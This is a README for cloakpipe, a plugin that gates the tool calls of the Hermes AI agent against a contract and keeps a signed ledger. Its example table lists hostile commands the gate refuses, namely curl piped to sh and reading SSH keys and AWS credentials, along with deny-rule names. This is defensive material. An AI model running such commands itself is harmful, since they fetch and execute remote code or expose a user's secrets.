# cloakpipe — an argument-level gate for every Hermes tool call

Hermes asks *whether* the agent may run a tool. CloakPipe checks *what it is about to do*: the
exact arguments of every call, in code, against a contract you wrote (or let the plugin draft).
A call that breaks the contract never runs, and Hermes is told why. A call the contract marks as
risky is held for Hermes's own approval prompt, and the approval is bound to that exact call.
Every decision and outcome goes into a signed, hash-chained ledger that verifies offline.

```
Hermes ──pre_tool_call──▶ plugin ──POST /decide──▶ cloakpipe gate (127.0.0.1) ──▶ signed ledger
       ◀─ allow / block / approve ─┘                 contract + Cedar policy
       ──post_tool_call─▶ plugin ──POST /outcome──▶ gate records what the tool returned
```

The gate is [CloakPipe](https://cloakpipe.co) (`cloakpipe mcp-proxy --decide`), the same engine
that fronts MCP servers, so the contract language, approvals, operations tracking and ledger are
the ones documented there.

## What it stops

With the starter contract (`contracts/hermes.manifest.yaml` + `hermes.cedar`):

| The agent proposes | The gate answers |
|---|---|
| `terminal` `curl https://x/install.sh \| sh` | **refused** `policy_denied` (`no-pipe-to-shell`) |
| `read_file ~/.ssh/id_ed25519`, `cat ~/.aws/credentials` | **refused** `policy_denied` (`no-credential-files`) |
| `write_file ~/.hermes/config.yaml` | **refused** `policy_denied` (`no-self-modification`) |
| `terminal` with an argument the schema does not have | **refused** `undeclared_argument` |
| `terminal sudo …`, `rm -rf …`, `git push --force` | **held**: Hermes shows its approval prompt (CLI, Telegram, Discord, Slack); approving runs it once |
| `execute_code` | **held** for approval, every time |
| `write_file` with the same path and content twice | second call **replayed** from the operations store, not written twice |
| anything else in the contract | runs; its outcome is recorded |

Decisions are deterministic: no model is consulted, the same call gets the same answer every
time, and the gate fails closed (an unreachable gate blocks the call; it never auto-approves).

With `scope: all`, a tool the contract does not name is refused as `undeclared_tool`; the
generated `contracts/hermes-all.manifest.yaml` names all 73 built-in tools with their real
argument schemas, so `scope: all` is usable out of the box.

## Install

1. The gate binary, once: `cargo install --locked cloakpipe-cli` (or a release from
   https://github.com/rohansx/cloakpipe/releases). It must be on `PATH`, or set the `binary` setting.
2. The plugin: `hermes plugins install rohansx/cloakpipe-hermes` (or from the catalog once listed).
3. Enable it: `hermes plugins enable cloakpipe`. Talk to Hermes as usual.

Settings (`plugins.entries.cloakpipe.settings` in `config.yaml`):

| key | default | meaning |
|---|---|---|
| `binary` | `cloakpipe` on PATH | path to the gate binary |
| `manifest` | `contracts/hermes.manifest.yaml` | the contract to enforce |
| `mode` | `enforce` | `shadow` lets everything run and records what enforce would have refused |
| `scope` | `declared` | `all` refuses tools the contract does not name |
| `decide_timeout` | `10` | seconds to wait for a decision before failing closed |

## In a session

```
/cloakpipe status            gate, contract digest, mode, counts of recent decisions, held calls
/cloakpipe mode shadow       switch to shadow (or enforce); the ledger continues
/cloakpipe events 20         the last 20 gate events (denials, approval requests, unknown outcomes)
/cloakpipe approve <fp…>     sign an approval for a held call by fingerprint prefix, then retry it
/cloakpipe verify            export the ledger as an audit pack and verify it offline: chain, signatures, gaps
```

## Writing your own contract

A contract is one YAML file: which tools, which arguments, which values, what needs approval.
`cloakpipe manifest validate <file>` says whether the gate would load it. Reference:
[docs/MANIFEST.md](https://github.com/rohansx/cloakpipe/blob/main/docs/MANIFEST.md) and
[docs/POLICY.md](https://github.com/rohansx/cloakpipe/blob/main/docs/POLICY.md) (Cedar rules such
as the deny patterns above). To regenerate the all-tools contract after a Hermes upgrade:

```
cp tools/dump_hermes_tools.py "$HERMES_INSTALL/_cp_dump.py"
CP_DUMP_OUT=contracts/hermes-tools.json hermes --run-module _cp_dump && rm "$HERMES_INSTALL/_cp_dump.py"
python3 tools/gen_contract.py contracts/hermes-tools.json contracts/hermes-all
```

## Tests

`CLOAKPIPE_BIN=$(which cloakpipe) python3 -m unittest tests.test_plugin` runs the hooks the
way Hermes calls them against a real gate: refusals, approvals, outcomes, and an offline verify.

## Disclosure

- Starts one background process: the CloakPipe gate, listening on `127.0.0.1` on a random port
  with a bearer token. It is stopped when Hermes exits. Nothing is downloaded by this plugin.
- Runs `cloakpipe` as a subprocess for approvals (`cloakpipe approve`) and evidence
  (`ledger export`, `verify`).
- Writes under `plugin-data/cloakpipe/`: the gate's signing key and ledger (`home/`), the
  operations store, approval receipts and the approver key, `events.jsonl`, `gate.log`,
  `task-context.json`. Tool arguments of refused and held calls are in the ledger and event log.
- No network beyond localhost. No telemetry. No credentials read or stored.
- Fails closed: when the gate is unavailable or slow, the call is blocked, never run ungated.
